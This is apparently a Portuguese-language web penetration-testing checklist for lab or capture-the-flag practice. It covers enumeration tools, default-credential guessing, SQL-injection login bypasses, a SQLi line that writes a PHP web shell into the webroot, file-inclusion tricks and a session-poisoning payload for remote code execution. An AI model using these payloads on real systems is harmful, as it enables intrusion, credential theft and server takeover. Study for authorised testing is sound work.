# guia_pratico

## Web

1: Verifique se é um serviço HTTP ou HTTPS. Se for HTTPS, verifique seu certificado,se não
tem alguma vulnerabilidade SSL, como a vulnerabilidade HeartBleed, a ferramenta está disponível https://github.com/drwetter/testssl.sh

2: Se necessário, enumere seus subdomínios, adicione o host virtual ao `/etc/hosts`

3: Acesse o URL de destino em um navegador, Chrome e Firefox


## OSINT

1: Verifique seu conteúdo, como `blogs, comentários, perfis de usuários`, etc.
encontre algo sobre `usuários/membros/equipe`, crie uma lista de `possíveis
nomes de usuário/senhas`

2: Se usa um `modelo oficial`? Se assim for, você dificilmente encontrará algo útil.
Caso contrário, continue enumerando

3: `Tema` e `função` deste aplicativo. Esse site é de `Suprimentos`? `Para médico`? Para
`gerenciamento de dispositivo`? etc.

## Source Code  / Page Source

1: `valor padrão` de um elemento

2: `Comentários`, procure por `"<!-"`

3: `Link`, procure por `"href"`

4: `Elemento oculto`. Use a ferramenta de desenvolvimento (dev-tool) para fazê-lo aparecer

5: Mesmo que uma página da web pareça vazia, lembre-se de verificar sua fonte

## Header

1: Burpsuite é o preferido

2: Verifique o cabeçalho especial, que pode revelar sua `API`

## Diretório e arquivo

0: Enumerar todos os `subdomínios` e `hosts virtuais`

1: Se o servidor web for executado em uma `porta incomum`, tente o protocolo `HTTP` e `HTTPS`

2: `nikto -h http://10.10.10.10`

3: Combine os resultados de `pelo menos dois scanners`

4: `dirb http://10.10.10.10`

5: `gobuster dir -u http://10.10.10.10 -w dir.txt -x html,txt,php,aspx,java -t 20`
(`-k`, se `https`)

6: Use o dicionário do aplicativo específico: como o dicionário do `SharePoint CMS`

7: diretório oculto
  - a. `hostname, domain, username, service name` como um diretório
  - b. Mencionado em `conteúdo da web`, como um `blog`
  - c. Procure o `documento/github` repo do aplicativo
  - d. `robots.txt`, `sitemap.xml`
  - e. Arquivo de configuração
  - f. Mensagens de erro
  - g. `código fonte`, `comentários`
  - h. protegido por uma autenticação básica: `gobuster dir -U admin -P admin -u
http://10.10.10.10/private -w dir.txt -x html,php,aspx,txt -t 20`

8: `Repositório/documento oficial` do GitHub do aplicativo da mesma versão

## API Endpoint

0: Semelhante ao `diretório e arquivo`

1: `wfuzz -c -z arquivo,/usr/share/wfuzz/wordlist/general/common.txt --hc 404
http://10.10.10.10/FUZZ/`

2: Mencionado no `conteúdo da web`

3: Em `solicitações e respostas`

4: `Código fonte`, `comentário`

## Credencial fraca

1: Sempre tente `admin:admin` primeiro ou `admin:password`, `guest:guest`,  `admin:password123`, `user:admin`

2: Pesquise no Google por `login/credencial` padrão -> Exemplo: `joomla default credentials`

## Webroot

1: Se o webroot de um servidor web compartilhar o mesmo diretório com `SMB` ou `FTP`, e
você tem `permissão de gravação`, tente fazer `upload de um web shell`

2: No `Linux`, uma webroot geralmente é `/var/www/html` ou `/var/www/[appname]` - Lembre-se que depende muito do OS, no `free-bsd` o mesmo app pode ser localizado em um caminho diferente ao encontrado em outra distro, como por exemplo, uma distro Ubuntu.

3: Aproveite o `SQLi` para escrever um `backdoor` para webroot: `' UNION SELECT ("<?php
echo passthru($_GET['cmd']);") INTO OUTFILE 'var/www/html/cmd.php' -- -'`

4: Recupere webroot de `mensagens de erro`, `phpinfo`, etc.

## CGI

1: Vulnerabilidade de `Shellshock`

## Login Bypass

Existem várias maneiras de ignorar o login

1: A `autenticação não ajuda`, ou a autenticação é `desnecessária` para nossa
`enumeração/exploração`. Esta é uma das situações mais ideais.

2: Credencial `padrão/fraca`. Esta é também uma das situações mais ideais.

3: carga útil `SQLi`

  - a)
       ```
       username=admin' or '1'='1
       password=[arbitrary]
       ```
  - b)
       ```
       username=admin
       password=' or '1'='1
       ```
  - c)
       ```
       username=admin
       password=' or 1=1-- -
       ```
  - d)
       ```
       username=admin' or 1=1-- -
       password=[arbitrar]
       ```
       
4: `Adivinhe uma credencial` com base em `OSINT` ou `engenharia social`. Antes de adivinhar,
você precisa coletar algumas informações. Como o apelido do administrador, o nome real do administrador
nome, nome da equipe, nome do serviço, nome do aplicativo, etc. Eles podem ser
nomes de usuário em potencial. Para senha, pode ser o mesmo que nome de usuário e
não se esqueça de tentar algumas senhas mais simples, como senha, admin, 123456, password,
qwerty, etc.

5: `Registre` um novo user

6: `Solicitações` de `autenticação básica`

7: Revise o `código-fonte`, especialmente os `comentários`

8: Use `SQLi` para `recuperar` ou `substituir` a credencial

9: Use `XSS` para `roubar cookie`

10: `Sessão de reutilização`

11: `OSINT`, como `blogs`, `comentários`, etc.

12: Ataque de `dicionário`, ataque de `força bruta`. Use-o como `última opção`. ZAP é recomendado.

## File Inclusion

1: Se um nome de argumento for como `view`, `file`, `page`, `skin`, `theme`, `lang`, `template`, etc., a inclusão de arquivos é altamente possível

2: Se LFI for confirmado, tente `RFI` também

3: Se o RFI não funcionar, altere o protocolo `HTTP/FTP` para o protocolo `SMB`.

4: Se o RFI realmente não existir, use o LFI para ler alguns `arquivos confidenciais`, como um
`config` que contém `credenciais`. Em seguida, aproveite a `credencial coletada` para
próxima exploração

5: Alternar entre `caminho absoluto` e `caminho relativo`

6: Inclua `arquivos de configuração de serviço`, como `/etc/apache2/sites-available/000-default.conf`, `/etc/vsftpd.conf`, etc.

7: Use o `filtro PHP` para verificar o `código-fonte`: http://10.10.10.10?page=php://filter/convert.base64-codificar/recurso=view.php

8: Se `XXE` for possível, também pode levar a `LFI`

9: A própria LFI tem `algumas abordagens` que levam ao `RCE`

  - 1: Incluir arquivo de sessão
    - a: Preencha um formulário POST para fazer username= `<?php system("[command]");?>`
    - b: Observe o valor da sessão e, em seguida, localize o arquivo de sessão php. Normalmente em
`/var/lib/phpx/sess_[SessionId]`, `/tmp/sess_[SessionId]`
    - c: Incluir o arquivo de sessão
    
  - 2: phpinfo + LFI
    - a: Se file_uploads estiver ativado
    - b: PoC script: https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-
as-www-data-via-phpinfoph
